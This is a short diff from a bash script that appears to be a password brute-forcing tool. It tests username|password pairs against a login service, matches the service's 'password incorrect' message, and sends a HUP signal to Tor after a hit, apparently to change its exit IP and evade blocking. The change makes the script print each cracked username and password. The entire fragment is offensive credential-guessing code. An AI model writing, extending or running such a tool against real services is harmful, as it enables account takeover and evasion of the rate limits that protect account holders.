@@ -102,8 +102,9 @@ rm -rf u.txt
      #echo $MESAG
      
      if [[ $statu_se =~ "ok" ]]; then
-              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)[I GOT IT SUCCES]  \n"
-              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)USERid -> ${USER_ui}  \n"
+              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)[I GOT IT SUCCES]"
+              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)${lst_user}|${psss}"
+              echo -e "$(UI.Color.Green)[+] $(UI.Color.Default)USERid -> ${USER_ui}"
               killall -HUP tor
      elif [[ $MESAG =~ "The password you entered is incorrect. Please try again." ]]; then
                  echo -e "$(UI.Color.Red)[!] $(UI.Color.Default)WRONG_PASSWORD ${lst_user}|${psss}\n"
